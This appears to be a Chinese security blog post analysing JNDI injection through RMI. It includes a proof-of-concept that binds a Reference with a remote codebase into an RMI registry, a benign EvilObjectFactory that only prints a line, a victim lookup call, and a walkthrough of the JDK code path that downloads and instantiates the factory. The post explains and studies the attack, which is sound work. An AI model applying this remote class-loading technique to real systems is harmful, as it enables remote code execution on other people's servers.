> 原文链接: https://www.anquanke.com//post/id/87031 


# 【技术分享】关于 JNDI 注入


                                阅读量   
                                **181051**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01480dfee2b0b54112.jpg)](https://p3.ssl.qhimg.com/t01480dfee2b0b54112.jpg)

<br>

**前言**

一篇炒冷饭的文章，全当笔记在写了，这个漏洞涉及到 JNDI 与 RMI。 这里我主要只写一些其他的 “JNDI 注入” 分析文章没写过的东西，如果你看的不是很明白的话可以配合其他人写的分析文章一起看。



**需要知道的背景知识**

JNDI 的概念不细写了，只需要知道我们通过 JNDI 的接口就可以存取 RMI Registry/LDAP/DNS/NIS 等所谓 Naming Service 或 DirectoryService 的内容

JNDI API 中涉及到的常见的方法与接口的作用，如：Context.lookup

JNDI 中 ServiceProvider 以及 ObjectFactory 的作用

**<br>**

**Reference 类的作用**

RMI 的相关基础知识，可以看我另一篇公众号，我记的非常全。



**JNDI Service Provider**

JNDI 与 JNDI Service Provider 的关系类似于 Windows 中 SSPI 与 SSP 的关系。前者是统一抽象出来的接口，而后者是对接口的具体实现。如上面提到的默认的 JNDI Service Provider 有 RMI/LDAP 等等。。



**ObjectFactory**

每一个 Service Provider 可能配有多个 Object Factory。Object Factory 用于将 Naming Service（如 RMI/LDAP）中存储的数据转换为 Java 中可表达的数据，如 Java 中的对象或 Java 中的基本数据类型。 JNDI 的注入的问题就出在了可远程下载自定义的 ObjectFactory 类上。你如果有兴趣的话可以完整看一下 Service Provider 是如何与多个 ObjectFactory 进行交互的。



**PoC**

```
public static void main( String[] args ) throws Exception
`{`
    // 在本机 1999 端口开启 rmi registry，可以通过 JNDI API 来访问此 rmi registry
    Registry registry = LocateRegistry.createRegistry(1999);
    // 创建一个 Reference，第一个参数无所谓，第二个参数指定 Object Factory 的类名：
    // jndiinj.EvilObjectFactory
    
    // 第三个参数是 codebase，表明如果客户端在 classpath 里面找不到 
    // jndiinj.EvilObjectFactory，则去 http://localhost:9999/ 下载
    // 当然利用的时候这里应该是一个真正的 codebase 的地址
    Reference ref = new Reference("whatever",
            "jndiinj.EvilObjectFactory", "http://localhost:9999/");
    // 利用 ReferenceWrapper 将前面的 Reference 对象包装一下
    // 因为只为只有实现 Remote 接口的对象才能绑定到 rmi registry 里面去
    ReferenceWrapper wrapper = new ReferenceWrapper(ref);
    registry.bind("evil", wrapper);
`}`
```

**<br>**

**EvilObjectFactory**

代码如下：

```
public class EvilObjectFactory implements ObjectFactory `{`
    public Object getObjectInstance(Object obj, Name name,
                                    Context nameCtx,
                                    Hashtable&lt;?, ?&gt; environment) 
            throws Exception `{`
        
        System.out.println("executed");
        return null;
    `}`
`}`
```

**<br>**

**Victim**

Victim 需要执行 Context.lookup，并且 lookup 的参数需要我们可控。



```
public static void main(String[] args) throws Exception `{`
    Context ctx = new InitialContext();
    // ctx.lookup 参数需要可控
    System.out.println(ctx.lookup("rmi://localhost:1999/evil"));
`}`
```

<br>

**我的疑问**

最开始看到 PoC 的时候，我以为这是 RMI Class Loading 导致的受害者会去指定的 codebase 下载我们指定的类并去实例化，因为产生了很大的疑惑。

因为 RMI Class Loading 是有条件限制的，比如说默认禁用，以及与 JVM 的 codebase 配置有很大的关系。

PoC 里面向 rmi registry 绑定 ReferenceWrapper 的时候，真正绑定进去的应该是它的 Stub 才对，Stub 的对象是怎么造成客户端的代码执行的。

因为懒，这个疑问一直存在了很长时间，直到我开始正式去调试跟一下这个漏洞看看到底发生了什么。后来我看在 marshalsec 那篇 pdf 里面也提到了这个问题。

<br>

**Victim 端的触发流程**

1.    ctx.lookup 最终会进入 com.sun.jndi.rmi.registry.RegistryContext.lookup。因为传入的 jndi url 是以 rmi:// 开头的。

```
public Object lookup(Name var1) throws NamingException `{`
    if (var1.isEmpty()) `{`
        return new RegistryContext(this);
    `}` else `{`
        Remote var2;
        try `{`
            var2 = this.registry.lookup(var1.get(0));
        `}` catch (NotBoundException var4) `{`
            throw new NameNotFoundException(var1.get(0));
        `}` catch (RemoteException var5) `{`
            throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
        `}`
        return this.decodeObject(var2, var1.getPrefix(1));
    `}`
`}`
```

2.    在 lookup 里面通过 this.registry.lookup 查找出远程对象，赋给 var2。这里的 var2 确实是 com.sun.jndi.rmi.registry.ReferenceWrapper_Stub 类型的。证明我的想法是没有错的，存入 rmi registry 的确实是一个 stub。

3.    进入 this.decode



```
private Object decodeObject(Remote var1, Name var2) throws NamingException `{`
    try `{`
        Object var3 = var1 instanceof RemoteReference ?
                ((RemoteReference)var1).getReference() : var1;
        return NamingManager.getObjectInstance(var3, var2, 
                this, this.environment);
    `}` catch (NamingException var5) `{`
        throw var5;
    `}` catch (RemoteException var6) `{`
        throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
    `}` catch (Exception var7) `{`
        NamingException var4 = new NamingException();
        var4.setRootCause(var7);
        throw var4;
    `}`
`}`
```

4.    this.decode 内将 stub 还原成了 Reference，这里解决了我一个疑惑。随后进入 NamingManager.getObjectInstance

5.    NamingManager.getObjectInstance 内部发现当前 JVM 中不存在 Reference 中指定的 object factory，就自动去我们指定的 codebase 地址下载（并不是利用的 RMI Class Loading 机制，所以解决了我另一个疑惑）并实例化我们指定的 Object Factory 类，并调用其 javax.naming.spi.ObjectFactory#getObjectInstance 方法。 



**参考资料**

http://docs.oracle.com/javase/jndi/tutorial/TOC.html

http://www.javaworld.com/article/2076888/core-java/jndi-overview–part-1–an-introduction-to-naming-services.html
